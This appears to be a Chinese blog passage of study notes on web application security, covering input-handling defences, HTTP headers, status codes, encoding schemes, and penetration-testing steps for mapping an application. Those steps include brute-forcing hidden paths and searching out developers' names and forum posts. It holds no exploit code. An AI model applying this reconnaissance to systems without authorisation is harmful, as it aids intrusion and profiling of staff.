<h3 id="核心安全问题：用户可提交任意输入"><a href="#核心安全问题：用户可提交任意输入" class="headerlink" title="核心安全问题：用户可提交任意输入"></a>核心安全问题：用户可提交任意输入</h3><p>用户在浏览器事实上拥有无限的权限，因此可以提交任意非开发者预期的内容，而开发者需要假设所有的输入都可能是恶意的，并进行防范；</p>
<h3 id="关键问题因素"><a href="#关键问题因素" class="headerlink" title="关键问题因素"></a>关键问题因素</h3><p>以下几点原因让问题变得更加严重了：</p>
<ul>
<li>不成熟的安全意识</li>
<li>独立开发</li>
<li>欺骗性的简化；</li>
<li>快速发展的攻击技术；</li>
<li>资源与时间限制；</li>
<li>技术上强其所难；</li>
<li>对功能的需求不断增加；</li>
</ul>
<h3 id="新的安全边界"><a href="#新的安全边界" class="headerlink" title="新的安全边界"></a>新的安全边界</h3><p>早期安全边界在于防火墙层级，但随着Web应用程序的功能变得更加模块后，需要访问操作系统中或者之间不同功能模块，例如数据库，使得安全边界问题缩小到了Web应用程序内部；</p>
<h3 id="Web应用程序安全的未来"><a href="#Web应用程序安全的未来" class="headerlink" title="Web应用程序安全的未来"></a>Web应用程序安全的未来</h3><p>暂时还没有迹象显示安全问题能够在不远的未来得到解决，因为整个行业远未形成成熟的意识或者能力；</p>
<h1 id="2-核心防御机制"><a href="#2-核心防御机制" class="headerlink" title="2. 核心防御机制"></a>2. 核心防御机制</h1><h2 id="处理用户访问"><a href="#处理用户访问" class="headerlink" title="处理用户访问"></a>处理用户访问</h2><p>多数Web应用使用以下三种安全机制处理用户访问，但由于这三个机制之间相互依赖，因此导致它们不能达到预期的安全保护目标；</p>
<ul>
<li>身份验证</li>
<li>会话管理</li>
<li>访问控制：由于这方面的控制相当复杂，因此一般存在大量的安全漏洞；</li>
</ul>
<h2 id="处理用户输入"><a href="#处理用户输入" class="headerlink" title="处理用户输入"></a>处理用户输入</h2><h3 id="输入的多样性"><a href="#输入的多样性" class="headerlink" title="输入的多样性"></a>输入的多样性</h3><p>有些字段有特殊格式的输入要求，但有些字段，例如文章、备注等，则需要允许各式各样的输入值；</p>
<p>当探查到用户的非法输入，正常应该拒绝用户提交的，并将事件记录到日志文件中，以便随后进行调查；</p>
<h3 id="输入处理方法"><a href="#输入处理方法" class="headerlink" title="输入处理方法"></a>输入处理方法</h3><h4 id="拒绝已知的不良输入"><a href="#拒绝已知的不良输入" class="headerlink" title="拒绝已知的不良输入"></a>拒绝已知的不良输入</h4><p>通常是使用一个黑名单，包含一组攻击中会使用的模式，阻击任何与黑名单匹配的数据；但这种方法的效率不同，也存在各种绕过的方法；</p>
<h4 id="接受已知的正常输入"><a href="#接受已知的正常输入" class="headerlink" title="接受已知的正常输入"></a>接受已知的正常输入</h4><p>使用一个白名单；这种方法比黑名单要好得多，但有时候有些字段存在迫不得已的情况，例如用户的姓名；</p>
<h4 id="净化"><a href="#净化" class="headerlink" title="净化"></a>净化</h4><p>即在开始处理数据之前，先对数据进行净化，删除或转义可能存在的恶意字符；这种方法一般非常有效；不过在一个输入项中容纳多个可能的恶意数据时，有时不能完全净化成功；</p>
<h4 id="安全数据处理"><a href="#安全数据处理" class="headerlink" title="安全数据处理"></a>安全数据处理</h4><p>通过确保处理的过程绝对安全，例如在数据库查询过程中使用参数化查询以避免 SQL 注入攻击；这也是一项有效的通用方法，不过不能够适用于Web应用程序需要执行的每个操作；</p>
<h4 id="语法检查"><a href="#语法检查" class="headerlink" title="语法检查"></a>语法检查</h4><p>攻击的输入是正常的，但输入的用途是非法的，例如伪装成他人的账号；</p>
<h3 id="边界确认"><a href="#边界确认" class="headerlink" title="边界确认"></a>边界确认</h3><p>由于Web 应用程序提供的功能很广泛，因此不同功能组件之间并不存在一个统一的安全边界，需要具体情况具体处理，每个功能组件执行自己的安全检查；</p>
<h3 id="多步确认与规范化"><a href="#多步确认与规范化" class="headerlink" title="多步确认与规范化"></a>多步确认与规范化</h3><p>Web应用程序有时会对用户输入进行多步的确认，或者做一些规范化的操作，此时攻击者可以专门设计一些针对这些操作的输入字符，以避开检查机制；</p>
<h2 id="处理攻击者"><a href="#处理攻击者" class="headerlink" title="处理攻击者"></a>处理攻击者</h2><p>常见措施：</p>
<ul>
<li>处理错误</li>
<li>维护审计日志；</li>
<li>向管理员发出警报；</li>
<li>应对攻击；</li>
</ul>
<h3 id="处理错误"><a href="#处理错误" class="headerlink" title="处理错误"></a>处理错误</h3><p>避免向用户返回任何由系统生成的错误信息，因为它们将非常容易被攻击者有效利用；一般使用 try…catch 机制来生成自定义的错误信息，并将异常情况记录到日志中，以便后续进一步检查处理；</p>
<h3 id="维护审计日志"><a href="#维护审计日志" class="headerlink" title="维护审计日志"></a>维护审计日志</h3><p>在任何注重安全的应用程序中，日志应记录所有重要事件，这些事件至少包括：</p>
<ul>
<li>所有与身份验证功能相关的事件，如成功或失败的登录，密码修改等；</li>
<li>关键交易，例如信用卡支付与转账；</li>
<li>被访问控制机制阻止的访问企图；</li>
<li>任何包含已知攻击字符串，公然表明恶意意图的请求；</li>
</ul>
<p>有效的审计日志一般会记得每个事件的发生时间、发出请求的IP地址、用户的账号等信息；这些信息需要进行严格的保护，避免未授权的读取或写入访问。一般来说，需要将它们存储在单独的系统中，仅允许主应用程序访问，或者存储在一次性写入的介质中；如果这些日志被攻击者利用，将可能使攻击者立即攻破整个应用程序；</p>
<h3 id="向管理员发出警报"><a href="#向管理员发出警报" class="headerlink" title="向管理员发出警报"></a>向管理员发出警报</h3><p>警报监控的反应事件一般包括：</p>
<ul>
<li>应用反常：如收到由单独一个IP 地址或用户发出的大量请求（表明应用程序正受到自定义攻击）；</li>
<li>交易反常；</li>
<li>包含已知攻击字符串的请求；</li>
<li>请求中普通用户无法查看的数据被修改；</li>
</ul>
<p>由于每个应用程序实际业务场景各不相同，因此最好的警报机制，是根据当前业务场景，判断哪些输入是普通用户不可能出现的，然后与警报机制整合，第一时间发出警报；</p>
<h3 id="应对攻击"><a href="#应对攻击" class="headerlink" title="应对攻击"></a>应对攻击</h3><p>当发现攻击者时，应当设计能够采取自动反应的措施，以阻止攻击进行探查，例如对其提交的请求的响应速度变缓慢，或将其加入黑名单1-2天，或者终止攻击者的会话，要求其重新登录等；</p>
<p>当然，最重要的事件还是应该立即修复应用程序中存在的所有漏洞；</p>
<h2 id="管理应用程序"><a href="#管理应用程序" class="headerlink" title="管理应用程序"></a>管理应用程序</h2><p>很多应用程序使用相同的 Web 界面在内部执行管理功能，但是它无形中也变成一个主要的攻击目标，因为攻破这个界面后，能够有效提升权限；</p>
<h1 id="3-Web应用程序技术"><a href="#3-Web应用程序技术" class="headerlink" title="3. Web应用程序技术"></a>3. Web应用程序技术</h1><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><h4 id="HTTP-请求头部中的一些字段："><a href="#HTTP-请求头部中的一些字段：" class="headerlink" title="HTTP 请求头部中的一些字段："></a>HTTP 请求头部中的一些字段：</h4><ul>
<li>Referer：用来表示发出请求的原始 URL；</li>
<li>User-Agent：用来显示发出请求的客户端（如浏览器）的信息</li>
<li>Host：用来显示被访问的 URL 中的主机名称；</li>
<li>Cookie：用来显示服务器向客户端发送的参数；</li>
</ul>
<h4 id="HTTP-响应中的一些字段"><a href="#HTTP-响应中的一些字段" class="headerlink" title="HTTP 响应中的一些字段"></a>HTTP 响应中的一些字段</h4><ul>
<li>Server：用来显示服务端所使用的服务器程序，例如：Apache、Nginx、 Microsoft-IIS等；</li>
<li>Pragma：用来告知浏览器不要缓存结果（适用于动态资源的场景）；</li>
<li>Expires：用来告知浏览器当前资源的过期时间；</li>
<li>Content-Type：用来告知浏览器主体的内容类型，以便浏览器可以正确解析；</li>
<li>Content-Length：用来告知浏览器主体的长度；</li>
</ul>
<h4 id="HTTP-方法"><a href="#HTTP-方法" class="headerlink" title="HTTP 方法"></a>HTTP 方法</h4><p>由于 GET 请求会将请求参数显示在 URL 中，并且可以存储在书签或是放在请求头部的 Referer 字段中，因此应避免使用查询字符串传送任何敏感的信息；</p>
<p>其他方法：</p>
<ul>
<li>TRACE：当使用该方法访问某个资源时，服务端会在响应的主体中返回其收到的客户端的具体请求内容；因此，客户端可以用它来诊断自身发出的请求是否在中途被窜改了；</li>
<li>OPTIONS：用来向服务端询问某个资源允许的操作方法；服务端会在返回的响应的头部 Allow 字段中列出可执行的方法；</li>
</ul>
<blockquote>
<p>HTTP 还有其他一些允许的方法，如果服务端激活的方法越多，则面临被攻击的风险越大；</p>
</blockquote>
<h4 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h4><p>常用的 URL 是绝对路径的格式，但其实也支持使用相对路径的格式；</p>
<h4 id="REST"><a href="#REST" class="headerlink" title="REST"></a>REST</h4><p>REST 风格的 URL 一般是指将查询参数放在路径中，而不是放在查询字符串中；</p>
<h4 id="HTTP-消息头"><a href="#HTTP-消息头" class="headerlink" title="HTTP 消息头"></a>HTTP 消息头</h4><h5 id="常用消息头："><a href="#常用消息头：" class="headerlink" title="常用消息头："></a>常用消息头：</h5><ul>
<li>Connection：告知对方在完成 HTTP 传输后，如何处理当前的 TCP 连接状态，例如保持开放，或者直接关闭；</li>
<li>Content-Encoding：为消息主体中的内容指定编码格式，例如 gzip（很多应用会使用该格式来压缩响应主体中的内容，以提高传输的速度）；</li>
<li>Transfer-Encoding：为某段传输指定编码格式（一个 HTTP 连接可以分成多段传输，每一段的消息可以使用不同的编码格式，例如：chunked、compress、deflate、gzip、identity等）；</li>
</ul>
<h5 id="请求消息头"><a href="#请求消息头" class="headerlink" title="请求消息头"></a>请求消息头</h5><ul>
<li>Accept：客户端用它来告知服务端自己可以接收哪些类型的内容，例如图片、文档等；</li>
<li>Accept-Encoding：用来告知服务端，客户端可接受的内容编码方式；</li>
<li>Authorization：提供服务端所要求的认证类型和认证信息，例如：basic类型+用户名+密码，需要配合 HTTPS 使用，不然等同于明文传输账号密码；</li>
<li>If-Modified-Since：用来告知服务端浏览器最后一次收到当前所请求资源的时间；如果在那个时间之后，资源并未出现变化，则服务端不需返回资源内容，只需要返回304编码，告知客户端之前的缓存仍可用；</li>
<li>If-None-Match：用来告知服务端，如果服务端没有任何资源与该字段的 Etag 值匹配，则应返回所请求的资源，否则则无须返回，浏览器将使用本地的缓存；</li>
<li>Origin：用来告知服务器当前请求来自于哪个站点，该字段一般用于跨域 Ajax 请求中；</li>
<li>Referer：用来告知服务器表明当前请求所来源页面的地址；</li>
</ul>
<h5 id="响应消息头"><a href="#响应消息头" class="headerlink" title="响应消息头"></a>响应消息头</h5><ul>
<li>Access-Control-Allow-Origin：用来告知客户端是否允许跨域请求当前的资源；</li>
<li>ETag：为当前资源设置一个唯一标签，后续客户端可以使用该标签，向服务端询问所请求的资源是否已经过期；</li>
<li>Expires：用于告知客户端当前资源的过期时间；</li>
<li>Location：用来告知客户端资源重定向的目标地址，一般配合 3 开头的状态码使用；</li>
<li>Pragma：用来告知浏览器如何处理缓存，例如：no-cache；</li>
<li>Server：用来告知客户端，服务端当前使用的是什么样的服务器软件；</li>
<li>Set-Cookie：服务端用来向客户端发送 cookie 值；</li>
<li>WWW-Authenticate：服务端用其来告知客户端自己支持哪些身份验证方式，一般配合 401 状态码使用；</li>
<li>X-Frame-Options：服务端用其来告知客户端如何加载当前响应；</li>
</ul>
<h4 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h4><p>cookie 一般由一个键值对构成，但也可包含任何不含空格的字符串；可以在服务器响应中使用几个 Set-Cookie 消息头发布多个 cookie；客户端也可以在 Cookie 消息头中用分号分隔不同的 cookie；</p>
<p>服务端发出的 Set-Cookie 消息头中，还可以包含一些额外的属性，以指示客户端如何处理使用 cookie， 包括：</p>
<ul>
<li>expires：用来设定 Cookie 的有效时间；如果没有值，则浏览器不会永久保存当前 cookie，仅用于当前浏览器会话中；如果有值，则浏览器会将 cookie 值在本地存储下来，并在随后的浏览器会话中重复使用；</li>
<li>domain：用来指定 cookie 可以有效使用的域；指示客户端仅可以将 cookie 用于 domain 所指定的域；</li>
<li>path：用于指定 cookie 可以使用的路径；</li>
<li>secure：限制只在 https 请求中使用 cookie；</li>
<li>HttpOnly：用来限制客户端无法使用 JavaScript 直接访问 cookie；</li>
</ul>
<h4 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h4><p>每条 HTTP 响应消息都会在它的第一行中包含一个状态码，状态码主要分为五类：</p>
<ul>
<li>1开头的：提供信息</li>
<li>2开头的：请求被成功处理；</li>
<li>3开头的：请求被重新定向到其他资源；</li>
<li>4开头的：请求中包含错误；</li>
<li>5开头的：服务器在处理请求时发生错误；</li>
</ul>
<h5 id="常见的状态码"><a href="#常见的状态码" class="headerlink" title="常见的状态码"></a>常见的状态码</h5><ul>
<li>100 Continue：已收到请求的消息头，但主体还没有完整收到，客户端应继续发送余下的主体，待全部收到后，将返回新的响应；</li>
<li>200 Ok：请求已成功处理，并在响应中返回了请求结果；</li>
<li>201 Created：请求已成功提交；</li>
<li>301 Moved Permanently：所请求的资源已经永久性的转移到一个新的地址，新地址放在 Location 字段中，客户端后续应使用这个新地址来访问相应的资源；</li>
<li>302 Found：所请求的资源临时转移到了一个新地址，新地址放在 Location 字段中；但转移只是临时的，后续请求该资源应仍然使用旧地址；</li>
<li>304 Not Modified：在客户端的请求中，会有一个 If-Modified-Since 字段，记录着客户端上一次收到该资源的时间，服务端根据这个时间，判断在那之后，资源是否发生过修改，如果没有修改，就可以发回 304 响应，告知客户端所请求的资源未更新，让客户端使用缓存中的资源副本；另外客户端也可以在请求首部中使用 If-None-Match 字段，并在该字段中放上资源的 Etag 值，如果服务端发现存在相同 Etag 值的资源，则返回 304 响应；如果不存在，则返回所请求的资源；</li>
<li>400 Bad Request：表示客户端提交了一个无效的请求；</li>
<li>401 Unauthorized：表示客户端的请求没有验证成功，同时服务端会在响应的 WWW-Authenticate 字段中放上如何验证的信息；</li>
<li>403 Forbidden：表示所请求的资源绝对禁止访问，有身份验证也不行；</li>
<li>404 Not Found：表示所请求的资源不存在；</li>
<li>405 Method Not Allow：表示所请求的方法不支持；</li>
<li>413 Request Entity Too Large：表示请求的主体过长，服务端无法处理；</li>
<li>414 Request URI Too Long：表示请求的地址过长，服务端无法处理；</li>
<li>500 Internal Server Error：表示服务端在处理请求时遇到错误；</li>
<li>503 Service Unavailable：表示服务端的服务器程序虽然运转正常，但处理请求的应用程序无法作出响应；</li>
</ul>
<h4 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h4><p>HTTPS 跟 HTTP 一样，也属于传输层的协议，但是它使用 TLS&#x2F;SSL 对传输的数据进行了加密；</p>
<h4 id="HTTP-代理"><a href="#HTTP-代理" class="headerlink" title="HTTP 代理"></a>HTTP 代理</h4><p>当使用 HTTPS 和使用代理向服务端发起请求时，客户端无法和代理服务器完成 TSL 握手，因此，代理服务器只能被当作 TCP 中继来使用；这意味着如果能够控制代理服务器的话，就能拦截并修改客户端和服务端之间的请求和响应数据；这将非常有用（原因在于可以控制浏览器发出的请求，并分析和修改服务器返回的响应；多数渗透测试工具都是以代理服务器的形式来运行）；</p>
<h4 id="HTTP-身份验证"><a href="#HTTP-身份验证" class="headerlink" title="HTTP 身份验证"></a>HTTP 身份验证</h4><p>HTTP 身份验证有内置自己的身份验证功能，包括：</p>
<ul>
<li>Basic</li>
<li>NTLM</li>
<li>Digest</li>
</ul>
<p>由于 HTTP 内置的验证功能，会将服务端要求提供的验证身份信息（如密码）放到消息头部中，因此如果不使用 HTTPS 连接的，这种验证方式将会是很危险的，因为如果请求被拦截的话，就会导致验证信息暴露；如果使用了 HTTPS，则这种验证方式就没那么危险；</p>
<h2 id="Web-功能"><a href="#Web-功能" class="headerlink" title="Web 功能"></a>Web 功能</h2><h3 id="服务器端的功能"><a href="#服务器端的功能" class="headerlink" title="服务器端的功能"></a>服务器端的功能</h3><p>相对于互联网早期，服务器端提供的资源已经从以静态为主，变成了以动态资源为主，同时针对 Web 应用程序的开发也出现了各式各样的工具，了解这些工具，研究它们的漏洞，将十分有助于找出它们的案例隐患；</p>
<p>常用的服务端开发工具或平台包括：</p>
<ul>
<li>Java</li>
<li>ASP.Net</li>
<li>PHP</li>
<li>Ruby On Rails</li>
<li>SQL</li>
<li>XML</li>
<li>Web 服务</li>
</ul>
<h3 id="客户端的功能"><a href="#客户端的功能" class="headerlink" title="客户端的功能"></a>客户端的功能</h3><p>常用的浏览器开发工具或技术：</p>
<ul>
<li>HTML</li>
<li>超链接</li>
<li>表单</li>
<li>CSS</li>
<li>Javascript</li>
<li>VBScript</li>
<li>文档对象模型</li>
<li>Ajax</li>
<li>JSON</li>
<li>同源策略：从相同站点收到的内容，可以访问并修改该站点的其他内容；但不能访问或修改不同站点的内容；这个策略由浏览器实现；</li>
<li>HTML5</li>
<li>Web2.0</li>
<li>浏览器插件</li>
</ul>
<h3 id="状态与会话"><a href="#状态与会话" class="headerlink" title="状态与会话"></a>状态与会话</h3><p>会话即可保存在服务器端，也可以保存在客户端；保存在服务器端的话，则需要给客户端发送一个令牌；保存在客户端则可以减轻服务器的负担；但是保存在浏览器端的数据有可能被用户修改，因此在将数据发给客户端保存之前，一般会使用一个只有服务端才知道的值，对数据做散列值计算，之后将数据和散列值都发给客户端；客户端需要在下一次请求中同时携带会话数据和散列值，如果会话数据被修改了，则服务端对会话数据进行计算的散列值和用户提供的散列值将无法匹配（如果会话是存储在服务器端的话，就没有这个必要了，直接将散列后的会话 ID 发给客户端即可；之所以要做散列，目的是让客户端无法猜测出来其他会话 ID，以避免客户端冒充他人）；</p>
<h2 id="编码方案"><a href="#编码方案" class="headerlink" title="编码方案"></a>编码方案</h2><p>客户端发送给服务器的数据一般需要使用某种编码方案，服务器端在数据后，按照指定的方案对数据进行解码；因此，如果客户端操纵编码方案，有可能会让看似无害的信息，编码成另外一种解释；</p>
<h3 id="URL-编码"><a href="#URL-编码" class="headerlink" title="URL 编码"></a>URL 编码</h3><p>URL 的编码方案使用 ASCII 字符集中的可打印字符对数据进行编码；该编码方案以 % 开头；</p>
<blockquote>
<p>%20 代表空格，另外 + 加号也代表空格；</p>
</blockquote>
<p>有些字符是 URL 编码方案的保留关键字，因此如果在请求内容中使用这些字符，则需要对这些字符进行编码的转换，不然会被识别成关键字；包括：空格、%、？、&amp;、；、+、# 等；</p>
<h3 id="Unicode-编码"><a href="#Unicode-编码" class="headerlink" title="Unicode 编码"></a>Unicode 编码</h3><p>Unicode 编码以 %u 开头，之后是用十六进制表示的编码，例如 %u2215 表示斜杠 “&#x2F;“；</p>
<p>Unicode 的编码长度统一是4位的十六进制，相当于 16 位的二进制，或许也可叫做 UTF-16；</p>
<p>UTF-8 则是一种长度可变的编码方案，它有可能只有一个字节，也有可能有多个字节；由于大部分字符是不常用的，如果将常用的字符用短编码来表示的话，则将会大大减少编码后的内容长度，提高传输效率；</p>
<h3 id="HTML-编码"><a href="#HTML-编码" class="headerlink" title="HTML 编码"></a>HTML 编码</h3><p>在 HTML 文档中，由于 HTML 语言也有一些保留的关键字，因此如果在内容中使用了这些关键字，就需要对其进行 HTML 编码，以便不会识别成关键字；</p>
<p>HTML 编码使用了三种编码方案，都是以 &amp; 开头，包括：</p>
<ul>
<li>实体：例如 &amp;quot 表示双引号，&amp;apos 表示单引号，&amp;amp 表示 &amp;；</li>
<li>十进制：以&amp;# 开头并加上字符的 ASCII 编码，例如：&amp;#34 表示双引号，&amp;#39 表示单引号</li>
<li>十六进制：以&amp;#x 开头，并加上字符的 ASCII 编码的十六进制数，例如：&amp;#x22 表示双引号，&amp;#x27表示单引号；</li>
</ul>
<h3 id="Base64-编码"><a href="#Base64-编码" class="headerlink" title="Base64 编码"></a>Base64 编码</h3><p>Base64 编码使用 ASCII 中的可打印字符集合对内容进行编码，一般使用于邮件附件的编码，有时也用于 HTTP 内置的验证机制中对用户密码进行编码；</p>
<p>Base64 使用的可打印字符集很少，包括以下 26个英文大写&#x2F;小写字母，数字0-9，还有加号”+”、斜杠”&#x2F;“，其他就没有了，总共是64个字符；</p>
<p>计算机中的数据是以字节表示的，每个字节由8个二进制位构成，因此每三个字节就会有24个二进制位；24个二进制位可以分成4组，每组6个二进制位，每组用一个 Base64 字符来表示，这样每 3 个字节就可以转换成 4 个Base64 字符来表示；</p>
<p>因此，只需要将待转换数据的字节总数是 3 的倍数（不足时使用等号 &#x3D; 进行凑齐），就可以将其他转换成 Base64 字符来表示；</p>
<blockquote>
<p>即使对一段数据进行细微的修改，则转换后的 Base64 编码也会出现很大的差别，但是由于它使用等号来凑齐字符，因此很容易被识别出来是 base64 编码方案，导致失去防患效果；</p>
</blockquote>
<h3 id="十六进制编码"><a href="#十六进制编码" class="headerlink" title="十六进制编码"></a>十六进制编码</h3><p>用 ASCII 字符表示十六进制数据块，例如：daf 表示为 646166</p>
<h3 id="序列化框架工具"><a href="#序列化框架工具" class="headerlink" title="序列化框架工具"></a>序列化框架工具</h3><p>使用一些框架对待传输的数据进行序列化，这些框架包括：</p>
<ul>
<li>Flex 和 AMF</li>
<li>Silverlight 和 WCF</li>
<li>Java 序列化对象</li>
</ul>
<h1 id="4-解析应用程序"><a href="#4-解析应用程序" class="headerlink" title="4. 解析应用程序"></a>4. 解析应用程序</h1><p>步骤：</p>
<ul>
<li>枚举应用程序的功能</li>
<li>分析其核心安全机制和使用的技术，以暴露其主要的受攻击面；</li>
<li>发现可供利用的漏洞；</li>
</ul>
<h2 id="枚举内容与功能"><a href="#枚举内容与功能" class="headerlink" title="枚举内容与功能"></a>枚举内容与功能</h2><h3 id="Web自动抓取"><a href="#Web自动抓取" class="headerlink" title="Web自动抓取"></a>Web自动抓取</h3><p>通过爬虫工具将应用程序的所有页面抓取下来；常见的免费工具包括：</p>
<ul>
<li>Burp Suite</li>
<li>WebScarab</li>
<li>Zed Attack Proxy</li>
<li>CAT</li>
</ul>
<blockquote>
<p>有些网站会在其根据目录放一个 robots.txt 文件，用来告知爬虫或者搜索引擎其不想被列入索引的 URL，不过这有时反而变成一个突破口，让攻击者能够快速发现一些可抓取的目标；</p>
</blockquote>
<p>爬虫的自动抓取还是比较简单和机械的，它不过是不断探查每个页面中存在的超链接，然后不断向新链接发起请求，如果链接中有表单，它就伪造一些数据进行表单的提交；直到抓取完所有页面链接为止；</p>
<h4 id="自动抓取工具的一些不足"><a href="#自动抓取工具的一些不足" class="headerlink" title="自动抓取工具的一些不足"></a>自动抓取工具的一些不足</h4><ul>
<li>无法处理动态生成的链接；</li>
<li>无法抓取存放在对象中的链接；</li>
<li>无法应对输入检查；</li>
<li>每个链接只请求一次，但实际上相同链接，使用不同请求参数可能返回不同的内容；</li>
<li>无法应对 URL 中的随机数，会造成死循环；</li>
<li>无法应对身份验证机制；</li>
</ul>
<h3 id="用户指导的抓取"><a href="#用户指导的抓取" class="headerlink" title="用户指导的抓取"></a>用户指导的抓取</h3><p>在客户端和服务端之前设立一道拦截器，然后由用户人工浏览网站，做一些动作，之后拦截器根据拦截到的数据生成站点地图；这种方式可以克服前面自动抓取的多项不足；</p>
<h4 id="渗透测试步骤"><a href="#渗透测试步骤" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>配置浏览器，使用 Burp 或 WebScarab 作为本地代理服务器；</li>
<li>以常规方式浏览整个应用程序，访问发现的每一个链接，提交每一个表单并执行全部多阶段功能；分别在 javascript 启用与禁用、cookie 启用和禁用的情况下进行浏览；</li>
<li>检查由拦截工具生成的站点地图，找出手动浏览时没有发现的所有隐藏内容和功能，通过浏览器访问这些内容，以便拦截工具获得服务器的响应，从而确定其他所有内容；递归执行上述步骤，直到无法再找出新内容为止；</li>
<li>先将可能会导致会话中断的 URL 排除掉，然后基于余下的内容，让爬虫主动抓取站点内容；</li>
</ul>
<h3 id="发现隐藏的内容"><a href="#发现隐藏的内容" class="headerlink" title="发现隐藏的内容"></a>发现隐藏的内容</h3><p>常用的隐藏内容有：</p>
<ul>
<li>不同权限的用户登录后看到不同的内容；</li>
<li>上线后未删除的开发测试功能或者调试功能；</li>
<li>备份文件</li>
<li>文件快照的备份档案；</li>
<li>已部署但未上线可用的新功能；</li>
<li>已部署但对部分用户不可见的功能；</li>
<li>尚未从服务器上删除的旧版文件；</li>
<li>配置和包含敏感数据的文件；</li>
<li>当前应用程序功能的源文件；</li>
<li>包含有效用户名、会话令牌、被访问的 URL 以及所执行的操作的日志文件；</li>
<li>源代码中可能包含的用户名和密码等信息；</li>
</ul>
<h4 id="蛮力技巧"><a href="#蛮力技巧" class="headerlink" title="蛮力技巧"></a>蛮力技巧</h4><p>通过发送大量的请求，包含常见的目录名称，收集服务器的响应，来猜测隐藏功能的名称和标识符；</p>
<h5 id="渗透测试步骤-1"><a href="#渗透测试步骤-1" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h5><ul>
<li>手动提出一些访问有效与无效资源的请求，看服务器如何处理无效资源；</li>
<li>使用指导抓取生成的站点地图作为自动查找隐藏内容的基础；</li>
<li>针对基础应用程序内已知存在的每个目录或路径中常用的文件名和目录，自动发起请求；如果已经了解应用程序处理访问无效资源的处理方式，则可以配置 Intruder 等工具将其忽略；</li>
<li>收集从服务器返回的响应，手动检查这些响应以筛选出有效的资源；</li>
<li>反复执行这个过程，直到发现新内容；</li>
</ul>
<h4 id="通过公布的内容进行推测"><a href="#通过公布的内容进行推测" class="headerlink" title="通过公布的内容进行推测"></a>通过公布的内容进行推测</h4><p>一般来说，应用程序会使用某种命名方案，因此可以配置抓取工具按照命名方案进行搜索，这样可以提高命中的效率；</p>
<h5 id="渗透测试步骤-2"><a href="#渗透测试步骤-2" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h5><ul>
<li>检查用户指定的浏览与基本蛮力测试获得的结果，包括所有子目录名称、文件词干、文件扩展名列表等；</li>
<li>检查这些列表，确定应用程序所使用的命名方案；</li>
<li>有时候，命名方案中会使用数字和日期作为标识符，因此根据历史文件的命名，可以猜测出公司的新文件的命名；</li>
<li>检查所有客户端代码，如HTML 和 Javascript，寻找与隐藏内容有关的蛛丝马迹，例如代码中的注释部分，经常放着一些重要的线索，有时候甚至有高度敏感的信息；</li>
<li>把已经枚举出来的内容和文件名扩展名添加的常用列表中，它们有可能会揭示应用程序所使用的开发语言和工具；</li>
<li>搜索开发者工具和文件编辑器不经意建立的临时文件，例如 .DS_Store 文件；</li>
<li>结合目录、文件词干、文件扩展名列表，再进一步执行自动搜索操作，发掘更多隐藏的信息；</li>
<li>如果找到了一种统一的命名方案，则可以在这个基础上，实施更有针对性的蛮力测试；</li>
<li>基于新找到内容和新发现的模式，作为用户指导抓取操作的基础，反复执行之前的步骤，继续执行自动内容查找；</li>
</ul>
<blockquote>
<p>上述的大部分动作可以在 Burp Intruder Pro 的内容查找功能中实现；</p>
</blockquote>
<h4 id="利用公共信息"><a href="#利用公共信息" class="headerlink" title="利用公共信息"></a>利用公共信息</h4><p>如果应用程序中的内容在历史上曾经跟其他内容有所连接的话，则可以通过搜索引擎、Web档案等第三方工具将这些连接找出来；</p>
<h5 id="渗透测试步骤-3"><a href="#渗透测试步骤-3" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h5><ul>
<li>使用多种不同的搜索引擎和Web档案工具，查找它们保存的关于所要攻击的应用程序的相关信息；</li>
<li>查询搜索引擎时，可以使用搜索引擎提供的一些便利功能来提高搜索效率，例如：site, link, related 等关键字；</li>
<li>每次搜索时，不仅查看搜索引擎提供的默认部分中的内容，还可以看一下群组、新闻等部分的内容；</li>
<li>如果有部分内容被搜索引擎省略，可以将它们纳入搜索范围后，重新搜索；</li>
<li>查看感兴趣页面的缓存版本，里面可能包含一些未经过验证就无法查看的信息；</li>
<li>在属于相同组织的其他域名上执行相同的查询；</li>
</ul>
<p>一般来说，应用程序的开发人员，在开发过程中不可避免会遇到问题，并到一些论坛上面提问题和寻找答案，因此这些地方有可能会查到一些关于代码的信息；</p>
<h5 id="渗透测试步骤-4"><a href="#渗透测试步骤-4" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h5><ul>
<li>列出与待攻击应用程序相关的开发人员的姓名和邮件列表；</li>
<li>根据姓名查找他们在因特网上发表的所有问题和安全，分析发现的信息，了解与应用程序相关的线索；</li>
</ul>
<h4 id="利用-Web-服务器程序"><a href="#利用-Web-服务器程序" class="headerlink" title="利用 Web 服务器程序"></a>利用 Web 服务器程序</h4><p>Web 服务器程序本身也是存在大量漏洞的，利用这些漏洞可以获得应用程序所有页面和其他资源；更有意思的是， Web 服务器程序一般会结合很多第三方工具来提供一些便捷的功能，这些模块都会有一些安装规律，因为可以加以利用，暴露出一些其他办法查找不到资源路径；</p>
<blockquote>
<p>Nikto 或者 Wikto 即是可以执行上述扫描功能的免费工具；</p>
</blockquote>
<h3 id="应用程序页面与功能路径"><a href="#应用程序页面与功能路径" class="headerlink" title="应用程序页面与功能路径"></a>应用程序页面与功能路径</h3><p>基于 URL 的内容查找源于历史上的静态页面，现在很多服务端应用程序已经演变为以提供动态页面为主，经常在会参数中携带功能的名称，而不是在 URL 中显示，因此前面描述的那些方法不一定能够很好的发现所有的隐藏内容；</p>
<p>针对这种情况，渗透测试的步骤如下：</p>
<ul>
<li>确定所有通过在参数中提交功能名称的情况</li>
<li>修改之前提到的 URL 内容查找自动化的配置，以便让它能够应对这种新的情况；</li>
<li>如果可能的话，根据功能路径画一张应用程序的内容图，找出被枚举的功能和逻辑路径之间的依赖关系；</li>
</ul>
<h3 id="发现隐藏的参数"><a href="#发现隐藏的参数" class="headerlink" title="发现隐藏的参数"></a>发现隐藏的参数</h3><p>有时候开发人员会通过一些隐藏的参数来改变应用程序的行为，例如使用 debug 参数来开启或关闭调试功能；</p>
<p>渗透测试步骤：</p>
<ul>
